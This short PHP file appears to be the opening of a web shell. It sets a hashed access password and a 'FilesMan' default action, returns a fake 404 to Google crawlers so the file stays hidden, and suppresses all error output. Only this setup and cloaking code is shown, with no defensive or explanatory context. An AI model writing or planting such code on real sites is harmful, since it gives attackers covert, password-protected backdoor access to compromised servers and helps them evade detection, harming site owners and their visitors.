<?php
$auth_pass = "9c80a1eaca699e2fc6b994721f8703bc"; 
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
@define('SELF_PATH', __FILE__); 
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
    header('HTTP/1.0 404 Not Found'); 
    exit; 
} 
@session_start(); 
@error_reporting(0); 

?>